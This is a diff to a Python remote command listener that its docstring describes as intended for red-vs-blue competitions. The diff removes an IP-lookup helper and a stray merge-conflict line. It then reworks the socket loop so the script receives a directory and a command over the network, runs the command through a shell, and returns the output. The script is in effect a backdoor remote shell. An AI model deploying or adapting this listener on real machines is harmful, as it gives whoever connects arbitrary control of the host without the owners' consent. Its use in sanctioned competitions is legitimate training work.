@@ -13,25 +13,11 @@ Intended for red vs blue competitions.
 Author: Asa Horn
 """
 ############################################################helper functions
-#shamelessly stolen from stack overflow
-def get_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        # doesn't even have to be reachable
-        s.connect(('10.255.255.255', 1))
-        IP = s.getsockname()[0]
-    except Exception:
-        print('target fingerprint failed')
-        IP = '0.0.0.0'
-    finally:
-        s.close()
-    return IP
 
 
 ###############################################################Main
 def main(*args):
     controllerIP = ''
-    master
     password = ''
 
     if password == '':
@@ -72,20 +58,31 @@ def main(*args):
             with conn:
                 print('Command connection from', addr)
                 while True:
-                    data = conn.recv(1024)
-                    if not data:
+                    dir = conn.recv(1024)
+                    cmd = conn.recv(1024)
+                    if not cmd:
                         break
-                    print('Command received ' + data.decode("utf-8"))
-                    command = shlex.split(data.decode("utf-8"))
-                    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
-                    stdout, stderr = process.communicate()
+                    workDir = dir.decode("utf-8")
+                    command = shlex.split(cmd.decode("utf-8"))
+
+                    print('executing ', cmd, ' in directory ', dir)
+                    try:
+                        process = Popen(command, shell=True, cwd=workDir, stdout=PIPE, stderr=PIPE)
+                        stdout, stderr = process.communicate()
+                    except NotADirectoryError:
+                        stdout = ''
+                        stderr = 'Error: OS does not like file path specified. Check it and try again'
+
                     print('sending back """\n' + stdout.decode("utf-8"), stderr.decode("utf-8"), '"""\n\n')
                     if stderr:
                         conn.sendall(stderr)
-                    elif stdout:
+                    else:
+                        conn.sendall(b'no errors')
+                        
+                    if stdout:
                         conn.sendall(stdout)
                     else:
-                        conn.sendall(b'The command completed successfully with no output')
+                        conn.sendall(b'no output')
 
     ####### clean up
 
